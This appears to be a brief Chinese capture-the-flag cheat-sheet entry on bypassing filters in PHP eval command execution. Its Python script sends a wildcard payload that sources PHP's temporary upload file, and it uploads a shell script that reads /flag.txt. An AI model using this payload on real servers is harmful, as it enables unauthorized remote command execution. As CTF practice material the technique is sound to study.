# WEB绕过：

## eval执行命令类的一：

```
import requests

url = "url" # 替换为题目URL

params = {
    'cmd': '?><?=`. /???/p?p??????`;'
}
# POST 上传的文件内容

files = {
    'file': ('shell.sh', '#!/bin/sh\ncat /flag.txt')
}	
#!/bin/sh：调取shell，\n：换行，cat /flag.txt：实际执行命令


response = requests.post(url, params=params, files=files)
print(response.text)
```
